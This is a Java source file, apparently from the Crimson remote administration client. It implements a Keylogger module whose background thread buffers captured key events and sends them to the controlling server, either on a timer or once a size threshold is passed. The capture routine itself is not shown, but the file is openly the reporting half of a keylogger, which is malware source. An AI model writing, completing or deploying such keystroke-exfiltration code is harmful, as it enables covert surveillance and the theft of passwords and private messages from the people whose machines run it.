/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.modules;

import java.util.ArrayList;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.net.ClientCommands;
import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;

public enum Keylogger {
	;
	private static final Logger log = LoggerFactory.getLogger(Keylogger.class);

	private static Thread monitor;

	// dont forget to notify this buffer when using event method
	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>(4096);

	public static void start(RefreshMethod method, int value) {
		stop();
		log.info("Starting keylogger");
		monitor = new Thread(new Runnable() {
			public void run() {
				EV_KEvent k;
				try {
					switch (method) {
					case EVENT:
						while (!monitor.isInterrupted()) {
							// wait for an event
							buffer.wait();
							if (buffer.size() > value) {
								ClientCommands.flushKeybuffer();
							}

						}
						break;
					case TIME:
						while (!monitor.isInterrupted()) {
							Thread.sleep(value);
							ClientCommands.flushKeybuffer();

						}
						break;
					default:
						break;

					}

				} catch (InterruptedException e) {
					log.info("Exited monitoring thread");
				}

			}
		});
		monitor.start();
	}

	public static void stop() {
		if (monitor != null) {
			log.info("Stopping keylogger");
			monitor.interrupt();
			monitor = null;
		}

	}

	public static boolean isLogging() {
		return monitor == null ? false : monitor.isAlive();
	}

	public enum RefreshMethod {
		TIME, EVENT;
	}

}
